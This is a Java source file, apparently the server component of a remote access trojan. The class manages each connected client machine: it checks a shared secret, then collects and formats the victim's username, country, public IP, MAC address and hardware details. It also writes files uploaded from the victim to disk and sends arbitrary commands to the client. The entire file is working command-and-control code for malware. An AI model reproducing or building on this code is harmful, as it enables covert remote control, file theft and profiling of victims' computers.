package main.java.rat.server.connectedClients;

import main.java.Main;
import main.java.rat.Utils;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.listeners.InputOutputListener;
import main.java.rat.logger.StringLogger;
import main.java.rat.models.*;
import main.java.rat.server.RATServer;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

public class RATConnectedClient implements InputOutputListener {

    private final RATServer server;
    private final InputOutputHandler inputOutput;
    private final StringLogger logger;
    private boolean initStage = false;
    private int id;

    public ClientState state;

    public ComputerInfo clientComputerInfo;

    public RATConnectedClient(StringLogger logger, int id, InputOutputHandler inputOutputHandler, RATServer ratServer) {
        this.id = id;
        this.server = ratServer;
        this.inputOutput = inputOutputHandler;
        this.logger = logger;
        initStage = true;
        state = new ClientState();
        inputOutput.setListener(this);
    }

    @Override
    public void disconnected() {
        server.clientDisconnected(this);
    }

    @Override
    public void receivedMessage(Object rawMessage) {
        if (initStage) {
            if (rawMessage.equals(Main.SECRET)) {
                performInitStage();
            } else {
                server.incorrectSecret(this);
            }
        } else {
            SocketMessage message = (SocketMessage) rawMessage;
            if (message instanceof InfoSocketMessage) {
                logger.log((String) message.getContent());
            } else if (message instanceof ClientStateSocketMessage) {
                this.state = ((ClientStateSocketMessage) message).getContent();
            } else if (message instanceof FileSocketMessage) {
                handleFileMessage((FileSocketMessage) message);
            }
        }
    }

    private void handleFileMessage(FileSocketMessage fileMessage) {
        logger.log("Received file '" + fileMessage.fileName + "', size: " +
                Utils.readableByteSize(fileMessage.getContent().length));

        File destFile = new File(fileMessage.destination + File.separator + fileMessage.fileName);
        try {
            writeFile(destFile, fileMessage.getContent());
        } catch (IOException e) {
            logger.log("Error while writing file: ");
            e.printStackTrace();
        }
    }

    private void writeFile(File destination, byte[] content) throws IOException {
        FileOutputStream fos = new FileOutputStream(destination.getAbsolutePath());
        fos.write(content);
        fos.close();
    }

    public void sendCommand(String commandStr) {
        CommandSocketMessage commandMessage = new CommandSocketMessage();
        commandMessage.setContent(commandStr);
        sendMessage(commandMessage);
    }

    public void sendMessage(SocketMessage message) {
        this.inputOutput.sendMessage(message);
    }

    private void performInitStage() {
        try {
            String version = (String) inputOutput.readNextMessage();
            this.clientComputerInfo = (ComputerInfo) inputOutput.readNextMessage();

            this.initStage = false;
            server.successInit(this, version);
        } catch (Exception e) {
            server.unknownInitError(this, e);
        }
    }

    public String getFormattedComputerInfo() {
        ArrayList<String> userInfoArr = new ArrayList<>();
        userInfoArr.add("User info (null when not able to read):");
        userInfoArr.add("Current Username:\t" + clientComputerInfo.getComputerUsername());
        userInfoArr.add("Country:\t" + clientComputerInfo.getCountry());
        userInfoArr.add("Public ip:\t" + clientComputerInfo.getPublicIp());
        userInfoArr.add("Operating system:\t" + clientComputerInfo.getOs());

        userInfoArr.add("CPU cores:\t" + clientComputerInfo.getCPUCores());

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getCPUNames(),
                "CPU:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getGPUs(),
                "GPU:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getMonitors(),
                "Monitor:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getStorages(),
                "Storage device:\t"
        ));

        userInfoArr.add("MAC address:\t" + clientComputerInfo.getMacAddress());

        StringBuilder totalInfo = new StringBuilder();
        for (String infoLine : userInfoArr) {
            totalInfo.append(infoLine);
            totalInfo.append("\n");
        }

        return totalInfo.toString();
    }

    public RATServer getServer() {
        return server;
    }

    public boolean isInitStage() {
        return initStage;
    }

    public int getId() {
        return id;
    }

    public String getFullName() {
        return "client (" + getId() + ") '" + getName() + "'";
    }

    public String getName() {
        if (this.clientComputerInfo == null)
            return null;
        return this.clientComputerInfo.getComputerUsername();
    }
}
